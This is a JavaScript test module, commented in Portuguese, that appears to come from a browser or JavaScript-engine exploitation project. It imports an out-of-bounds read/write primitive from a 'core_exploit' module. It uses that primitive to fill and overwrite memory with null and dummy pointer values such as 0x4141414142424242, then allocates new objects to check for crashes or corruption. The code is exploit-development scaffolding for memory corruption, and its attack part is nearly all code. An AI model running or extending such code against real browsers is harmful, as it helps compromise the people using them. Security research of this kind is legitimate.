// js/script3/testExploreS1LeakEffect.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

async function perform_s1_leak_overwrite_test(test_name, value_to_overwrite_with, value_size_bytes) {
    const FNAME_SUBTEST = `perform_s1_leak_overwrite<${test_name}>`;
    logS3(`--- Sub-teste: Sobrescrevendo "Ponto de Interesse S1" com ${isAdvancedInt64Object(value_to_overwrite_with) ? value_to_overwrite_with.toString(true) : toHex(value_to_overwrite_with)} ---`, "subtest", FNAME_SUBTEST);

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando sub-teste.", "error", FNAME_SUBTEST);
        return false;
    }

    // Define uma região dentro do oob_array_buffer_real para simular o buffer do S1
    const s1_buffer_conceptual_start = OOB_CONFIG.BASE_OFFSET_IN_DV; // Ex: 128
    const s1_trigger_byte_offset = 32; // Relativo a s1_buffer_conceptual_start
    const s1_leak_pattern_offset = 28; // Relativo a s1_buffer_conceptual_start

    const absolute_trigger_write_addr = s1_buffer_conceptual_start + s1_trigger_byte_offset;
    const absolute_leak_pattern_addr = s1_buffer_conceptual_start + s1_leak_pattern_offset;
    const trigger_byte = 0xEE;

    logS3(`1. Preparando o padrão S1 em oob_array_buffer_real...`, "info", FNAME_SUBTEST);
    // Preenche a área relevante com 0xAA
    const fill_start = Math.min(absolute_trigger_write_addr, absolute_leak_pattern_addr) - 4; // Um pouco antes
    const fill_end = Math.max(absolute_trigger_write_addr, absolute_leak_pattern_addr) + 8; // Um pouco depois
    if (fill_start < 0 || fill_end > oob_array_buffer_real.byteLength) {
        logS3("ERRO: Offsets de preenchimento/teste fora dos limites do oob_array_buffer_real.", "error", FNAME_SUBTEST);
        clearOOBEnvironment();
        return false;
    }

    for (let i = fill_start; i < fill_end; i++) {
        try { oob_write_absolute(i, 0xAA, 1); } catch (e) { /* ignora */ }
    }
    logS3(`   Área [${toHex(fill_start)}-${toHex(fill_end-1)}] preenchida com 0xAA.`, "info", FNAME_SUBTEST);
    
    try {
        oob_write_absolute(absolute_trigger_write_addr, trigger_byte, 1);
        logS3(`   Byte gatilho 0x${toHex(trigger_byte,8)} escrito em offset abs ${toHex(absolute_trigger_write_addr)}.`, "info", FNAME_SUBTEST);
    } catch (e) {
        logS3(`   ERRO ao escrever byte gatilho: ${e.message}`, "error", FNAME_SUBTEST);
        clearOOBEnvironment();
        return false;
    }

    // Confirma o padrão "leak" esperado
    let initial_pattern_read;
    try {
        initial_pattern_read = oob_read_absolute(absolute_leak_pattern_addr, 8);
        logS3(`   Padrão inicial lido de ${toHex(absolute_leak_pattern_addr)} (8 bytes): ${isAdvancedInt64Object(initial_pattern_read) ? initial_pattern_read.toString(true) : 'ERRO LEITURA'}`, "leak", FNAME_SUBTEST);
        // Esperado (little-endian): Low = 0xAAAAAAAA, High = 0xAAAAAAEE
        if (isAdvancedInt64Object(initial_pattern_read) && initial_pattern_read.low() === 0xAAAAAAAA && initial_pattern_read.high() === 0xAAAAAAEE) {
            logS3("   Padrão S1 de referência confirmado!", "good", FNAME_SUBTEST);
        } else {
            logS3("   AVISO: Padrão S1 de referência NÃO confirmado. Prosseguindo com a sobrescrita de qualquer maneira.", "warn", FNAME_SUBTEST);
        }
    } catch (e) {
        logS3(`   ERRO ao ler padrão inicial: ${e.message}`, "error", FNAME_SUBTEST);
        clearOOBEnvironment();
        return false;
    }
    
    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Sobrescrevendo 8 bytes em ${toHex(absolute_leak_pattern_addr)} com ${isAdvancedInt64Object(value_to_overwrite_with) ? value_to_overwrite_with.toString(true) : toHex(value_to_overwrite_with)}...`, "warn", FNAME_SUBTEST);
    try {
        oob_write_absolute(absolute_leak_pattern_addr, value_to_overwrite_with, value_size_bytes);
        logS3("   Sobrescrita realizada.", "info", FNAME_SUBTEST);
    } catch (e) {
        logS3(`   ERRO ao sobrescrever padrão: ${e.message}`, "error", FNAME_SUBTEST);
        clearOOBEnvironment();
        return false;
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para efeitos se propagarem

    logS3("3. Tentando alocar novos objetos para observar efeitos...", "test", FNAME_SUBTEST);
    let new_ab_test, new_obj_test, new_arr_test;
    let allocation_error = false;
    try {
        logS3("   Tentando new ArrayBuffer(16)...", "info", FNAME_SUBTEST);
        new_ab_test = new ArrayBuffer(16);
        logS3(`     Novo ArrayBuffer alocado. Tamanho: ${new_ab_test.byteLength}`, "good", FNAME_SUBTEST);
        
        logS3("   Tentando new_obj = {a:1}...", "info", FNAME_SUBTEST);
        new_obj_test = { a: 1 };
        logS3(`     Novo objeto criado. new_obj.a = ${new_obj_test.a}`, "good", FNAME_SUBTEST);

        logS3("   Tentando new_arr = [1,2,3]...", "info", FNAME_SUBTEST);
        new_arr_test = [1, 2, 3];
        logS3(`     Novo array criado. Comprimento: ${new_arr_test.length}`, "good", FNAME_SUBTEST);

    } catch (e_alloc) {
        logS3(`   !!!! ERRO CRÍTICO AO ALOCAR NOVOS OBJETOS !!!!: ${e_alloc.name} - ${e_alloc.message}`, "critical", FNAME_SUBTEST);
        document.title = `CRASH/ERR Alloc Post Corrupt S1Leak`;
        allocation_error = true;
    }

    if (allocation_error) {
        logS3("   Conclusão do Sub-teste: Falha na alocação pós-sobrescrita.", "error", FNAME_SUBTEST);
    } else {
        logS3("   Conclusão do Sub-teste: Novas alocações bem-sucedidas. Nenhum crash óbvio.", "good", FNAME_SUBTEST);
    }
    
    clearOOBEnvironment();
    return !allocation_error; // Retorna true se não houve erro de alocação
}


export async function executeExploreS1LeakEffectTest() {
    const FNAME_TEST = "executeExploreS1LeakEffectTest";
    logS3(`--- Iniciando Teste: Exploração dos Efeitos da Sobrescrita do "Leak" do Script 1 ---`, "test", FNAME_TEST);
    document.title = `Explore S1 Leak Effect`;

    const test_values_qword = [
        { name: "NullPointer", val: new AdvancedInt64(0,0), size: 8 },
        { name: "DummyPointer", val: new AdvancedInt64("0x4141414142424242"), size: 8 }
    ];
    
    let overall_success = true;

    for (const test_case of test_values_qword) {
        const success = await perform_s1_leak_overwrite_test(test_case.name, test_case.val, test_case.size);
        if (!success) {
            overall_success = false;
            logS3(`   Sub-teste ${test_case.name} indicou falha ou erro.`, "error", FNAME_TEST);
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        if (document.title.includes("CRASH")) {
            logS3("Crash/Erro de alocação detectado. Interrompendo mais testes.", "error", FNAME_TEST);
            break;
        }
    }

    if (overall_success) {
        logS3("Todos os sub-testes de sobrescrita do 'Leak S1' e alocação completaram sem erros de alocação.", "good", FNAME_TEST);
    } else {
        logS3("Um ou mais sub-testes de sobrescrita do 'Leak S1' encontraram erros ou falhas de alocação.", "warn", FNAME_TEST);
    }

    logS3(`--- Teste Exploração dos Efeitos da Sobrescrita do "Leak S1" CONCLUÍDO ---`, "test", FNAME_TEST);
    document.title = `Explore S1 Leak Effect Done`;
}
